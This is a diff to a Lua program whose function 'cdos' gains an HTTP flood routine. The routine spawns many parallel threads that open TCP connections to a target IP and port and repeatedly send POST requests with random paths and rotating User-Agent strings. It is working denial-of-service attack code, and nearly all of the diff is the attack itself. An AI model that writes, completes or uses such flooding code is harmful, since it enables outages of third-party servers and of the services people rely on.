@@ -329,7 +329,33 @@ local function cdos()
                 end
                 collectgarbage("collect")
             else
-                
+                for i = 1, config.MAXTASK do --allocate
+                    activelanes[i] = lanes.gen("*", function()
+                                        local socket = require("socket")
+                                        local useragent = require("useragent")
+                                        math.randomseed()
+                                        for i = 1, 10 do
+                                            local tcp = assert(socket.connect(tostring(ip), tonumber(port)))
+                                            colord:curtosaveDEC()
+                                            tcp:send("POST "..tostring(randchar(config.packetsize)).." HTTP/1.1\r\n" .. 
+                                                "Host: " .. string.format("%s:%d", tostring(ip), tonumber(port)) .. "\r\n" .. 
+                                                "User-Agent: " .. useragent.ua[math.random(#useragent.ua)] .. 
+                                                "\r\nConnection: close\r\n\r\n"
+                                            ) -- for some reason useragent change every 10 seconds and not every run
+                                            tcp:close()
+                                            colord:curtosaveDEC()
+                                            io.write(string.format(colord:eraseinline().."send to %s:%d times: %d",ip,port,count))
+                                        end
+                                    end)()
+                    count = count + 1
+                end
+                for i = 1, #activelanes do  --free
+                    local sellanes = activelanes[i]
+                    sellanes:cancel()
+                    sellanes:join()
+                    activelanes[i] = nil
+                end
+                collectgarbage("collect")
             end
         end
         else
